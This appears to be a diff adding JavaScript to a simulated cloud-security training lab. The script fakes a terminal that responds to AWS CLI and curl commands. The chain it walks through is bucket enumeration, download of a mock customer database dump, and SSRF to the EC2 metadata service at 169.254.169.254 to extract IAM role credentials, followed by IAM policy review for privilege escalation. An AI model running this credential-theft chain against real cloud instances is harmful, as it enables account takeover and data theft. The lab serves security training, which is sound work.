+                               i === state.currentTask ? '<span style="color:#9333ea;">[CURR]</span>' :
+                               '<span style="color:#374151;">[ -- ]</span>';
+                LinuxTerminal.print(`  ${status} ${i + 1}. ${task.question.replace(/<[^>]+>/g, '').substring(0, 65)}`);
+            });
+            return;
+        }
+
+        /* ── AWS CLI command handling ─────────────────────────────── */
+        if (cmd === 'aws') {
+            const awsArgs = c.replace(/^aws\s+/, '');
+
+            /* aws s3 ls */
+            if (awsArgs.match(/^s3\s+ls\s*$/)) {
+                LinuxTerminal.print(S3_BUCKETS.map(b => `${b.created} s3://${b.name}`).join('\n'));
+                return;
+            }
+
+            /* aws s3 ls s3://bucket */
+            const s3LsMatch = awsArgs.match(/^s3\s+ls\s+s3:\/\/([^\s\/]+)/);
+            if (s3LsMatch) {
+                const bucket = s3LsMatch[1];
+                if (bucket === 'shopzone-backups') {
+                    const lines = BACKUP_BUCKET_FILES.map(f =>
+                        `${f.date}  ${String(f.size).padStart(12)} ${f.name}`
+                    );
+                    LinuxTerminal.print(lines.join('\n'));
+                } else if (bucket === 'shopzone-assets') {
+                    LinuxTerminal.print('                           PRE css/\n                           PRE js/\n                           PRE images/\n2025-10-01 12:00:00       2048 index.html');
+                } else if (bucket === 'shopzone-logs') {
+                    LinuxTerminal.print('<span style="color:#ef4444;">An error occurred (AccessDenied) when calling the ListObjectsV2 operation: Access Denied</span>');
+                } else if (bucket === 'shopzone-dev-configs') {
+                    LinuxTerminal.print('<span style="color:#ef4444;">An error occurred (AccessDenied) when calling the ListObjectsV2 operation: Access Denied</span>');
+                } else {
+                    LinuxTerminal.print(`<span style="color:#ef4444;">An error occurred (NoSuchBucket) when calling the ListObjectsV2 operation: The specified bucket does not exist</span>`);
+                }
+
+                /* Validate task */
+                if (t.validate(c)) {
+                    completeCurrentTask(t);
+                }
+                return;
+            }
+
+            /* aws s3 cp */
+            if (awsArgs.includes('s3 cp') && awsArgs.includes('db-dump.sql')) {
+                LinuxTerminal.print(`download: s3://shopzone-backups/db-dump.sql to ./db-dump.sql`);
+                LinuxTerminal.print(`<span style="color:#6b7280;">Completed 43.5 MiB/43.5 MiB with 1 file(s) remaining</span>`);
+                LinuxTerminal.print(`<span style="color:#22c55e;">Download complete: db-dump.sql (45,678,912 bytes)</span>`);
+
+                LinuxTerminal.addFilesystem({
+                    '/home/researcher/db-dump.sql': {
+                        type: 'file', perms: '-rw-r--r--', owner: 'researcher', group: 'researcher',
+                        size: 45678912,
+                        content: '-- ShopZone Production Database Dump\n-- Generated: 2025-11-01 02:00:00 UTC\n-- Tables: users, orders, payments, products, sessions\n\nCREATE TABLE users (\n  id INT PRIMARY KEY,\n  email VARCHAR(255),\n  password_hash VARCHAR(255),\n  full_name VARCHAR(100),\n  ssn_encrypted BLOB,\n  credit_card_token VARCHAR(50)\n);\n\nINSERT INTO users VALUES (1, \'admin@shopzone.io\', \'$2b$12$LJ3mTK...\', \'John Smith\', 0xAE39F..., \'tok_visa_4242\');\n...'
+                    }
+                });
+
+                if (t.validate(c)) {
+                    completeCurrentTask(t);
+                }
+                return;
+            }
+
+            if (awsArgs.includes('s3 cp')) {
+                const cpFileMatch = awsArgs.match(/s3:\/\/([^\s]+)/);
+                if (cpFileMatch) {
+                    LinuxTerminal.print(`<span style="color:#ef4444;">An error occurred (NoSuchKey) when calling the GetObject operation: The specified key does not exist.</span>`);
+                }
+                return;
+            }
+
+            /* aws sts get-caller-identity */
+            if (awsArgs.includes('sts') && awsArgs.includes('get-caller-identity')) {
+                const identity = state.credsExtracted ? {
+                    UserId: `AROA3XFRBF23EEXAMPLE:${IAM_ROLE_NAME}`,
+                    Account: ACCOUNT_ID,
+                    Arn: `arn:aws:sts::${ACCOUNT_ID}:assumed-role/${IAM_ROLE_NAME}/${INSTANCE_ID}`
+                } : {
+                    UserId: 'AIDAJQABLZS4A3QDU576Q',
+                    Account: ACCOUNT_ID,
+                    Arn: `arn:aws:iam::${ACCOUNT_ID}:user/researcher-readonly`
+                };
+                LinuxTerminal.print(JSON.stringify(identity, null, 4));
+
+                if (t.validate(c)) {
+                    completeCurrentTask(t);
+                }
+                return;
+            }
+
+            /* aws iam list-users */
+            if (awsArgs.includes('iam') && awsArgs.includes('list-users')) {
+                if (!state.credsExtracted) {
+                    LinuxTerminal.print('<span style="color:#ef4444;">An error occurred (AccessDenied) when calling the ListUsers operation: User: arn:aws:iam::' + ACCOUNT_ID + ':user/researcher-readonly is not authorized to perform: iam:ListUsers</span>');
+                    return;
+                }
+                LinuxTerminal.print(JSON.stringify({ Users: IAM_USERS }, null, 4));
+
+                if (t.validate(c)) {
+                    completeCurrentTask(t);
+                }
+                return;
+            }
+
+            /* aws iam list-policies */
+            if (awsArgs.includes('iam') && awsArgs.includes('list-policies')) {
+                if (!state.credsExtracted) {
+                    LinuxTerminal.print('<span style="color:#ef4444;">An error occurred (AccessDenied) when calling the ListPolicies operation: Access Denied</span>');
+                    return;
+                }
+                LinuxTerminal.print(JSON.stringify({ Policies: IAM_POLICIES }, null, 4));
+                return;
+            }
+
+            /* aws iam get-policy */
+            if (awsArgs.includes('iam') && awsArgs.includes('get-policy') && awsArgs.includes('--policy-arn')) {
+                if (!state.credsExtracted) {
+                    LinuxTerminal.print('<span style="color:#ef4444;">An error occurred (AccessDenied) when calling the GetPolicy operation: Access Denied</span>');
+                    return;
+                }
+
+                if (awsArgs.includes('Overpriv')) {
+                    LinuxTerminal.print(JSON.stringify(OVERPRIVILEGED_POLICY, null, 4));
+                    LinuxTerminal.print(`\n<span style="color:#ef4444;">CRITICAL: Policy grants Action: * on Resource: * (full admin access)</span>`);
+                    LinuxTerminal.print(`<span style="color:#ef4444;">Attached to: svc-deployment service account</span>`);
+
+                    if (t.validate(c)) {
+                        completeCurrentTask(t);
+                    }
+                    return;
+                }
+
+                if (awsArgs.includes('AdminFullAccess')) {
+                    LinuxTerminal.print(JSON.stringify({
+                        PolicyName: 'ShopZone-AdminFullAccess',
+                        PolicyVersion: { Document: { Version: '2012-10-17', Statement: [{ Effect: 'Allow', Action: ['s3:*', 'ec2:*', 'iam:*', 'rds:*'], Resource: '*' }] } }
+                    }, null, 4));
+                    return;
+                }
+
+                LinuxTerminal.print('<span style="color:#ef4444;">An error occurred (NoSuchEntity) when calling the GetPolicy operation: Policy not found</span>');
+                return;
+            }
+
+            /* Unrecognized aws command */
+            LinuxTerminal.print(`<span style="color:#f59e0b;">aws: unrecognized subcommand in this lab. Available: s3 ls, s3 cp, sts get-caller-identity, iam list-users, iam list-policies, iam get-policy</span>`);
+            return;
+        }
+
+        /* ── curl command handling (SSRF to metadata) ─────────────── */
+        if (cmd === 'curl') {
+            /* Metadata root */
+            if (c.includes('169.254.169.254/latest/meta-data/iam/security-credentials/' + IAM_ROLE_NAME)) {
+                const creds = {
+                    Code: 'Success',
+                    LastUpdated: '2025-11-15T14:30:00Z',
+                    Type: 'AWS-HMAC',
+                    AccessKeyId: ACCESS_KEY,
+                    SecretAccessKey: SECRET_KEY,
+                    Token: SESSION_TOKEN,
+                    Expiration: '2025-11-15T20:30:00Z'
+                };
+                LinuxTerminal.print(JSON.stringify(creds, null, 2));
+                state.credsExtracted = true;
+
+                LinuxTerminal.addFilesystem({
+                    '/home/researcher/.aws/credentials': {
+                        type: 'file', perms: '-rw-------', owner: 'researcher', group: 'researcher',
+                        size: 256,
+                        content: '[default]\naws_access_key_id = ' + ACCESS_KEY + '\naws_secret_access_key = ' + SECRET_KEY + '\naws_session_token = ' + SESSION_TOKEN + '\nregion = us-east-1'
+                    }
+                });
+
+                if (t.validate(c)) {
+                    completeCurrentTask(t);
+                }
+                return;
+            }
+
+            if (c.includes('169.254.169.254/latest/meta-data/iam/security-credentials/')) {
+                LinuxTerminal.print(IAM_ROLE_NAME);
+                state.roleNameFound = true;
+
+                if (t.validate(c)) {
+                    completeCurrentTask(t);
+                }
+                return;
+            }
+
+            if (c.includes('169.254.169.254/latest/meta-data/iam/')) {
+                LinuxTerminal.print('security-credentials/');
+                return;
+            }
+
+            if (c.includes('169.254.169.254/latest/meta-data/')) {
+                LinuxTerminal.print(`ami-id
+ami-launch-index
+ami-manifest-path
+block-device-mapping/
+events/
+hostname
+iam/
+identity-credentials/
+instance-action
+instance-id
+instance-life-cycle
+instance-type
+local-hostname
+local-ipv4
+mac
+metrics/
+network/
+placement/
+profile
+public-hostname
+public-ipv4
+public-keys/
+reservation-id
+security-groups
+services/`);
+
+                if (t.validate(c)) {
+                    completeCurrentTask(t);
+                }
+                return;
+            }
+
+            if (c.includes('169.254.169.254/latest/')) {
+                LinuxTerminal.print('dynamic\nmeta-data\nuser-data');
+                return;
+            }
+
+            if (c.includes('169.254.169.254')) {
+                LinuxTerminal.print('1.0\n2007-01-19\n2007-03-01\n2007-08-29\n2007-10-10\n2007-12-15\n2008-02-01\n2008-09-01\n2009-04-04\n2011-01-01\n2011-05-01\n2012-01-12\n2014-02-25\n2014-11-05\n2015-10-20\n2016-04-19\n2016-06-30\n2016-09-02\n2018-03-28\n2018-08-17\n2018-09-24\n2019-10-01\n2020-10-27\n2021-01-25\n2021-03-23\n2021-07-15\n2022-09-24\nlatest');
+                return;
+            }
+
+            /* Other curl */
+            LinuxTerminal.print(`<span style="color:#ef4444;">curl: (6) Could not resolve host. In this lab, only 169.254.169.254 (metadata) is reachable via curl.</span>`);
+            return;
+        }
+
+        /* ── export / env commands for credential setup ───────────── */
+        if (cmd === 'export') {
+            if (c.includes('AWS_ACCESS_KEY_ID') || c.includes('AWS_SECRET_ACCESS_KEY') || c.includes('AWS_SESSION_TOKEN')) {
+                LinuxTerminal.print(`<span style="color:#22c55e;">Environment variable set.</span>`);
+                if (!state.credsExtracted && c.includes(ACCESS_KEY)) state.credsExtracted = true;
+            }
+            return;
+        }
+
+        /* If command is not handled, check task validation */
+        if (t.validate(c)) {
+            completeCurrentTask(t);
+        } else if (c !== '') {
+            if (state.attempts[state.currentTask] >= 3) {
+                document.getElementById('taskHint').classList.add('show');
+            }
+        }
+    }
+
+    /* ── Complete current task ─────────────────────────────────────── */
+    function completeCurrentTask(t) {
+        LinuxTerminal.print(`\n<span style="color:#a855f7;">${t.successMessage}</span>`);
+        LinuxTerminal.print(`<span style="color:#3b82f6;">[DEFENDER] ${t.defender}</span>`);
+
+        LinuxTerminal.completeObjective(`obj${t.id}`);
+
+        document.getElementById('feedbackMessage').textContent = t.successMessage.substring(0, 72) + '...';
+        document.getElementById('feedbackMessage').className = 'feedback-message success';
+        state.results[state.currentTask] = 'correct';
+        markObjItem(state.currentTask, 'completed');
+        document.getElementById('taskNumber').classList.add('completed');
+        document.getElementById('skipBtn').disabled = true;
+        document.getElementById('hintBtn').disabled = true;
+
+        document.getElementById('defenderBox').classList.add('show');
+        document.getElementById('defenderText').textContent = t.defender;
+
+        updateProgress();
+        setTimeout(() => advanceTask(), 2400);
+    }
+
+    /* ── UI management functions ──────────────────────────────────── */
+    function buildObjList() {
+        document.getElementById('objList').innerHTML = TASKS.map((t, i) => {
+            const label = t.question.replace(/<[^>]+>/g, '');
+            const truncated = label.length > 55 ? label.substring(0, 55) + '...' : label;
+            return `<li class="obj-item${i === 0 ? ' active' : ''}" id="obj-item-${i}">
+                <div class="obj-check" id="obj-check-${i}">${i + 1}</div>
+                <span>${truncated}</span>
+            </li>`;
+        }).join('');
+    }
+
+    function showTask(i) {
+        const t = TASKS[i];
+        state.currentTask = i;
+        state.attempts[i] = state.attempts[i] || 0;
+
+        document.getElementById('taskNumber').textContent = i + 1;
+        document.getElementById('taskNumber').className = 'task-number';
+        document.getElementById('currentTaskNum').textContent = i + 1;
+        document.getElementById('taskQuestion').innerHTML = t.question;
+        document.getElementById('taskHint').textContent = t.hint;
+        document.getElementById('taskHint').classList.remove('show');
+        document.getElementById('feedbackMessage').textContent = 'Enter your command...';
+        document.getElementById('feedbackMessage').className = 'feedback-message';
+        document.getElementById('skipBtn').disabled = false;
+        document.getElementById('hintBtn').disabled = false;
+
+        document.querySelectorAll('.obj-item').forEach((el, j) => {
+            el.classList.remove('active');
+            if (j === i && !state.results[j]) el.classList.add('active');
+        });
+
+        LinuxTerminal.print(`\n<span style="color:#9333ea;">--- Objective ${i + 1} of ${TASKS.length} ---</span>`);
+    }
+
+    function showHint() {
+        if (document.getElementById('hintBtn').disabled) return;
+        score.hints += 5;
+        document.getElementById('taskHint').classList.add('show');
+        document.getElementById('hintBtn').disabled = true;
+        updateScoreDisplay();
+        LinuxTerminal.print(`<span style="color:#f59e0b;">[HINT -5 pts] ${TASKS[state.currentTask].hint}</span>`);
+    }
+
+    function skipTask() {
+        if (document.getElementById('skipBtn').disabled) return;
+        const hint = TASKS[state.currentTask].hint;
+        state.results[state.currentTask] = 'skipped';
+        markObjItem(state.currentTask, 'skipped');
+        document.getElementById('taskNumber').classList.add('skipped');
+        document.getElementById('skipBtn').disabled = true;
+        document.getElementById('hintBtn').disabled = true;
+        document.getElementById('feedbackMessage').innerHTML =
+            `<strong>Skipped.</strong> Answer: <code style="background:rgba(147,51,234,0.2);padding:1px 6px;border-radius:4px;color:#c084fc;">${hint.substring(0, 60)}...</code>`;
+        LinuxTerminal.print(`<span style="color:#f59e0b;">[SKIPPED] Answer was: ${hint}</span>`);
+
+        /* Advance state flags on skip */
+        if (state.currentTask === 3) state.roleNameFound = true;
+        if (state.currentTask === 4) state.credsExtracted = true;
+
+        updateProgress();
+        setTimeout(() => advanceTask(), 900);
+    }
+
+    function advanceTask() {
+        if (state.currentTask >= TASKS.length - 1) {
+            showResults();
+            return;
+        }
+        showTask(state.currentTask + 1);
+    }
+
+    function markObjItem(i, status) {
+        const el = document.getElementById(`obj-item-${i}`);
+        const ch = document.getElementById(`obj-check-${i}`);
+        if (!el || !ch) return;
+        el.classList.remove('active', 'completed', 'skipped');
+        el.classList.add(status);
+        ch.innerHTML = status === 'completed' ? '&#10003;' : '&#8212;';
+    }
+
+    function updateProgress() {
+        const completed = Object.values(state.results).filter(r => r === 'correct').length;
+        const total = Object.keys(state.results).length;
+        const pct = Math.round((total / TASKS.length) * 100);
+
+        document.getElementById('progressFill').style.width = pct + '%';
+        document.getElementById('completedCount').textContent = completed;
+        document.getElementById('progressPct').textContent = pct + '%';
+        updateScoreDisplay();
+    }
+
+    function updateScoreDisplay() {
+        const current = Math.max(0, score.base - score.hints);
+        document.getElementById('scoreFinal').textContent = current;
+        document.getElementById('headerScore').textContent = current;
+        document.getElementById('scoreHintDeduct').textContent = `-${score.hints} pts`;
+    }
+
+    function showResults() {
+        const completed = Object.values(state.results).filter(r => r === 'correct').length;
+        const skipped = Object.values(state.results).filter(r => r === 'skipped').length;
+        const finalPts = Math.max(0, score.base - score.hints);
+
+        document.getElementById('modalCompleted').textContent = completed;
+        document.getElementById('modalSkipped').textContent = skipped;
+        document.getElementById('modalScore').textContent = finalPts;
+
+        const modal = document.getElementById('modalContent');
+        modal.classList.remove('perfect');
+
+        if (completed === TASKS.length) {
+            modal.classList.add('perfect');
+            document.getElementById('modalIcon').innerHTML = '&#128293;';
+            document.getElementById('modalTitle').textContent = 'Full Compromise!';
+            document.getElementById('modalMessage').textContent =
+                'Complete cloud attack chain: S3 enumeration, SSRF to metadata, credential extraction, IAM privilege escalation. Perfect run.';
+        } else {
+            document.getElementById('modalIcon').innerHTML = '&#9729;';
+            document.getElementById('modalTitle').textContent = 'Lab Complete';
+            document.getElementById('modalMessage').textContent =
+                `${completed}/${TASKS.length} objectives completed. Review skipped steps to master cloud security testing.`;
+        }
+
+        document.getElementById('resultsModal').classList.add('show');
+
+        try {
+            if (typeof ModuleProgress !== 'undefined') {
+                ModuleProgress.complete('dark-arts', 'bh-lab-cloud', { returnUrl: '../index.html' });
+            }
+        } catch (e) {}
+
+        try {
+            if (typeof AchievementManager !== 'undefined') {
+                if (completed === TASKS.length && score.hints === 0) {
+                    AchievementManager.unlock('cloud_breacher');
+                }
+                if (completed >= 6) {
+                    AchievementManager.unlock('metadata_harvester');
+                }
+                if (state.credsExtracted) {
+                    AchievementManager.unlock('credential_exfil');
+                }
+            }
+        } catch (e) {}
+    }
+
+    function restartLab() {
+        document.getElementById('resultsModal').classList.remove('show');
+        document.getElementById('defenderBox').classList.remove('show');
+        score.hints = 0;
+        state.currentTask = 0;
+        state.results = {};
+        state.attempts = {};
+        state.credsExtracted = false;
+        state.roleNameFound = false;
+        updateScoreDisplay();
+        LinuxTerminal.destroy();
+        init();
+    }
+
+    document.addEventListener('DOMContentLoaded', init);
+    </script>
+
+    <script src="../../../../components/FluxCapacitor.js"></script>
+
+</body>
+</html>
